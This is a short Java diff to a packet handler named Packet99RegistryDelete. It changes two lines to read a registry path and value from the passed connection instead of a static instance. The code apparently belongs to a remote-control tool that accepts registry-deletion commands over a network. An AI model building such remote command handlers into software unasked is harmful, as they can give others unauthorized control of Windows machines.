@@ -8,8 +8,8 @@ public class Packet99RegistryDelete extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
-		String path = Connection.instance.readLine();
-		String value = Connection.instance.readLine();
+		String path = con.readLine();
+		String value = con.readLine();
 
 		try {
 			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
